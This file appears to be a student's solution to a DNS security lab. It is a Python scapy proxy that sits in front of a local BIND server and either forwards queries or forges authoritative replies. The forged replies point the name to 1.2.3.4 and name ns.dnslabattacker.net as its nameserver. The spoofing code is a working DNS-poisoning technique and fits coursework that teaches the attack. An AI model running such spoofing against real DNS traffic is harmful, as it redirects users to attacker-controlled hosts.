#!/usr/bin/env python2
import argparse
import socket
from scapy.all import *
# Overall structure
# Create a Proxy Server to constantly listen to the conversation between BIND (service) and dig (client)
# Forward queries from the client to the service, requires created a new DNS query packet at the proxy server
# OR create a fake response socket and forward it back to the client
# Forward the response of the service to the client (if not spoofing required)
# need: proxy port (to listen)

# part 3 needs to intercept the socket from getting to the BIND server, thus forge a fake one
# need scapy methods


def handler(data, dns_ip, dns_port, SPOOF):
    # return the responce either from the server or that's been faked
    service = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    query = DNS(data)
    # print(query.id)  # Prints the question section of the DNS packet
    # print(query.opcode)
    # print(query.aa)
    # print(query.tc)
    # print(query.rd)
    # print(query.ra)
    # print(query.z)
    # print(query.rcode)
    # print(query.qd)
    # print(query.an)

    if not SPOOF:
        service.sendto(data, (dns_ip, dns_port))
        response, _ = service.recvfrom(4096)
        # answer = DNS(response)
        # print(answer.id)
        # print(answer.tc)
        # print(answer.rd)
        # print(answer.ra)
        # print(answer.z)
        # print(answer.rcode)
        # print(answer.opcode)
        # print(answer.qd)
        # print(answer.an.rdata)
        # print(answer.an.rrname)
        return bytes(response)
    else:
        # from testing, several remarks:
        # id should be the same for query and response; qr should be 1 in response
        # opcode are the same
        # aa is flipped to 1; tc, rd, ra, z, rcode are the same
        # question should be the same
        # answer's rdata should be the thing that we change
        # answer's domain name should be consistent with the question
        fake_answer = DNSRR(rrname = query[DNSQR].qname, type='A', rdata="1.2.3.4")
        fake_ns = DNSRR(rrname = query[DNSQR].qname, type='NS', rdata="ns.dnslabattacker.net")/DNSRR(rrname = query[DNSQR].qname, type='NS', rdata="ns.dnslabattacker.net")
        response = DNS(id = query.id, qr = 1, aa = 1, tc = query.tc, rd = query.rd, ra = query.ra, z = query.z, rcode = query.rcode,
                        qd = query.qd, an = fake_answer, ancount = 1, ns = fake_ns, nscount = 2, arcount = 0)
        return bytes(response)


def run_proxy(proxy_port, dns_ip, dns_port, SPOOF):
    # operating a proxy server that listen to the request from the client and handle the request to form a response
    # create a listening socket over the network
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as client:
    client.bind(("0.0.0.0", proxy_port))

    while True:
        # extract data and (ip, port) of the client and send it to handler
        data, addr = client.recvfrom(4096)
        response = handler(data, dns_ip, dns_port, SPOOF)
        client.sendto(response, addr)


if __name__ == "__main__":
    # This is going to Proxy in front of the Bind Server

    parser = argparse.ArgumentParser()
    parser.add_argument("--port", help="port to run your proxy on - careful to not run it on the same port as the BIND server", type=int)
    parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int)
    parser.add_argument("--spoof_response", action="store_true", help="flag to indicate whether you want to spoof the BIND Server's response (Part 3) or return it as is (Part 2). Set to True for Part 3 and False for Part 2", default=False)
    args = parser.parse_args()

    # Port to run the proxy on
    proxy_port = args.port
    # BIND's port
    dns_port = args.dns_port
    # BIND's ip addr
    dns_ip = "127.0.0.1"
    # Flag to indicate if the proxy should spoof responses
    SPOOF = args.spoof_response

    run_proxy(proxy_port, dns_ip, dns_port, SPOOF)

